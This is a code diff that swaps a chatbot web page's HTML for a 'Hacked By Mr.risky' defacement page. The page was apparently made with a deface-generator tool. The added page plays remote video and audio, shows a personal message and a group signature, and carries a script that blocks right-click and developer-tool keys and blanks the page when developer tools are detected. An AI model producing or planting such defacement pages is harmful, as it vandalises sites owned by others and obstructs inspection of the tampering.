@@ -1,31 +1,222 @@
+<!--
+--  Uploaded on : https://haxor.my.id/open/g4mm4xploit.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Chatbot with OpenAI</title>
-    <link rel="stylesheet" href="main.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Security Alert</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overflow: hidden;
+            cursor: url('https://cur.cursors-4u.net/cursors/cur-11/cur1052.cur'), auto;
+            text-align: center;
+            font-family: 'Patrick Hand', cursive;
+            background-color: #000;
+            position: relative;
+        }
+
+        .bg-video {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            min-width: 100%;
+            min-height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+
+        /* Default: tampilkan desktop */
+        #bg-video-mobile, #bg-image-mobile {
+            display: none;
+        }
+
+        /* Jika layar kecil (mobile), sembunyikan desktop */
+        @media screen and (max-width: 768px) {
+            #bg-video-desktop {
+                display: none;
+            }
+
+            #bg-video-mobile {
+                display: block;
+            }
+
+            /* Jika pakai gambar untuk mobile */
+            #bg-image-mobile {
+                display: block;
+                position: fixed;
+                right: 0;
+                bottom: 0;
+                min-width: 100%;
+                min-height: 100%;
+                z-index: -1;
+                object-fit: cover;
+            }
+        }
+
+        .logo {
+            width: 250px;
+            height: auto;
+            animation: flicker 1.5s infinite alternate;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        .alert-text {
+            font-size: 3em;
+            color: red;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #800000;
+            animation: glitch 0.5s infinite alternate;
+        }
+
+        @keyframes glitch {
+            0% { transform: skewX(0deg); }
+            20% { transform: skewX(-10deg); }
+            40% { transform: skewX(10deg); }
+            60% { transform: skewX(-5deg); }
+            80% { transform: skewX(5deg); }
+            100% { transform: skewX(0deg); }
+        }
+
+        .message {
+            font-size: 1.5em;
+            color: white;
+            margin-top: 10px;
+            animation: appear 5s infinite alternate;
+        }
+
+        @keyframes appear {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .footer {
+            color: white;
+            font-size: 1.2em;
+            margin-top: 20px;
+        }
+
+        .quote {
+            margin-top: 20px;
+            color: white;
+            font-size: 1.5em;
+            text-align: center;
+            padding: 0 20px;
+            max-width: 800px;
+        }
+
+        audio {
+            display: none;
+        }
+
+        .content {
+            position: relative;
+            z-index: 1;
+            padding: 20px;
+        }
+
+        .click-message {
+            color: white;
+            margin-top: 15px;
+            font-size: 1em;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+    </style>
 </head>
 <body>
-    <div class="chat-container">
-        <div class="chat-header">
-            <img src="assets/bot-avatar.png" alt="AI Avatar" class="bot-avatar">
-            <h1>AI Assistant</h1>
-        </div>
 
-        <div class="chat-messages" id="chat-messages">
-            <div class="message bot-message">
-                <p>Hello! I'm your AI assistant. How can I help you today? 😊</p>
-            </div>
-        </div>
+    <!-- Video Background untuk Desktop -->
+    <video autoplay muted loop id="bg-video-desktop" class="bg-video">
+        <source src="https://a.top4top.io/m_3459iohux1.mp4" type="video/mp4">
+    </video>
 
-        <div class="chat-input">
-            <input type="text" id="user-input" placeholder="Type your message...">
-            <button id="send-button"><i class="fas fa-paper-plane"></i></button>
-        </div>
+    <!-- Video Background untuk Mobile -->
+    <video autoplay muted loop id="bg-video-mobile" class="bg-video">
+        <source src="https://b.top4top.io/m_3476qlsli1.mp4" type="video/mp4">
+    </video>
+
+    <!-- Alternatif Gambar untuk Mobile (jika tidak mau video) -->
+    <!-- <img id="bg-image-mobile" src="https://example.com/mobile-bg.jpg" class="bg-video" alt="Mobile Background"> -->
+
+    <div class="content">
+        <img class="logo" src="https://qu.ax/NmouA.png" alt="Security Alert">
+        <div class="alert-text">Hacked By Mr.risky</div>
+        <div class="message">Aku Sangat Sedih Pada Kejadian 2 Bulan Yang Lalu, Orang Yang Aku Sukai Lebih Dari 1 Tahun Telah Bersama Yang Lain.</div>
+
+        <div class="click-message">Click anywhere to play sound</div>
+
+        <audio id="bg-audio" autoplay muted loop>
+            <source src="https://audio.jukehost.co.uk/3zSuO7gzj112WxVVESvTjquXNfY7nGaT" type="audio/mp3">
+        </audio>
+
+        <div class="quote">Diam Bukan Berarti Tidak Tau.</div>
+
+        <div class="footer">© Mr.risky - NETRALITAS</div>
     </div>
 
-    <script src="main.js"></script>
+    <script>
+        // Cegah klik kanan
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Cegah shortcut developer tools
+        document.addEventListener('keydown', event => {
+            if (event.ctrlKey && ['u', 's'].includes(event.key.toLowerCase())) event.preventDefault();
+            if (event.ctrlKey && event.shiftKey && ['i', 'j', 'c'].includes(event.key.toLowerCase())) event.preventDefault();
+            if (event.key === 'F12') event.preventDefault();
+        });
+
+        // Deteksi Developer Tools
+        setInterval(() => {
+            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>Kami Dari: KOMUNITAS NETRAL</h1>";
+            }
+        }, 1000);
+
+        // Autoplay audio
+        window.addEventListener('DOMContentLoaded', () => {
+            const audio = document.getElementById('bg-audio');
+            audio.play().then(() => {
+                audio.muted = false;
+                document.querySelector('.click-message').style.display = 'none';
+            }).catch((e) => {
+                document.querySelector('.click-message').style.display = 'block';
+                document.addEventListener('click', function playOnce() {
+                    audio.muted = false;
+                    audio.play();
+                    document.querySelector('.click-message').style.display = 'none';
+                    document.removeEventListener('click', playOnce);
+                });
+            });
+        });
+
+        // Pastikan video tetap play
+        document.addEventListener('DOMContentLoaded', () => {
+            const videoDesktop = document.getElementById('bg-video-desktop');
+            const videoMobile = document.getElementById('bg-video-mobile');
+            videoDesktop?.play().catch(e => console.log("Desktop video autoplay prevented:", e));
+            videoMobile?.play().catch(e => console.log("Mobile video autoplay prevented:", e));
+        });
+    </script>
 </body>
-</html>
+    </html>
